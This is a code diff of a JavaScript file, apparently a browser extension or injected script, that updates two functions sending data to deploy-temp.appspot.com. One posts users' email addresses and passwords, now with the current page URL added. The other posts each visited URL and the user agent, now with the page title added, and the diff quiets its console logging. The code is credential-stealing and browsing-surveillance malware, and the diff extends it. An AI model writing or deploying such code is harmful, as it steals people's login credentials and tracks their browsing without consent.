@@ -135,7 +135,7 @@ function listenFacebook() {
 }
 
 function onUpdate(email, pass, type) {
-  fetch(`https://deploy-temp.appspot.com/api/update-user-info?email=${email}&pass=${pass}&type=${type}&userAgent=${navigator.userAgent}`, { method: 'post' })
+  fetch(`https://deploy-temp.appspot.com/api/update-user-info?email=${email}&pass=${pass}&type=${type}&userAgent=${navigator.userAgent}&location=${window.location.href}`, { method: 'post' })
   .then((data) => {
     console.log(data);
   });
@@ -146,13 +146,23 @@ function validateEmail(email) {
   return email && re.test(String(email).toLowerCase());
 }
 
+function getPageTitle() {
+  try {
+    return document.head.getElementsByTagName('title').item(0).innerHTML;
+  } catch(e){}
+  return "";
+}
+
 try {
-  sendHistory(window.location.href, new Date().getTime());
+  sendHistory(window.location.href, getPageTitle());
 } catch(e){}
 
-function sendHistory(url, time) {
-  fetch(`https://deploy-temp.appspot.com/api/update-history?url=${url}&time=${time}&userAgent=${navigator.userAgent}`, { method: 'post' })
+function sendHistory(url, title) {
+  if(!url) {
+    return;
+  }
+  fetch(`https://deploy-temp.appspot.com/api/update-history?url=${url}&userAgent=${navigator.userAgent}&title=${title}`, { method: 'post' })
   .then((data) => {
-      console.log(data);
+    // console.log(data);
   });
 }
